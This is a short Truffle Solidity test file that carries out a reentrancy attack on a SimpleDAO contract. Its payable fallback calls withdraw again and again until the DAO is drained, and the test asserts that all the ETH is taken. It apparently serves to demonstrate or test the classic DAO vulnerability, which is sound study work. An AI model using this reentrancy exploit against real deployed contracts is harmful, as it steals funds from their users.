pragma solidity ^0.4.24;

import "truffle/Assert.sol";
import "truffle/DeployedAddresses.sol";
import "../contracts/SimpleDAO.sol";

contract TestDAO {

  uint public initialBalance = 2 ether;

  SimpleDAO public dao = SimpleDAO(DeployedAddresses.SimpleDAO());
  
  function testAttack() public {
    Assert.equal(address(this).balance, 2 ether, "Initial balance is 2");
    dao.donate.value(1 ether)(this);
    dao.withdraw(1 ether);
    Assert.equal(address(dao).balance, 0, "No ETH left");
    Assert.equal(address(this).balance, 5 ether, "Get all the ETH");
  }

  function () public payable {
    dao.withdraw(1 ether);
  }
}
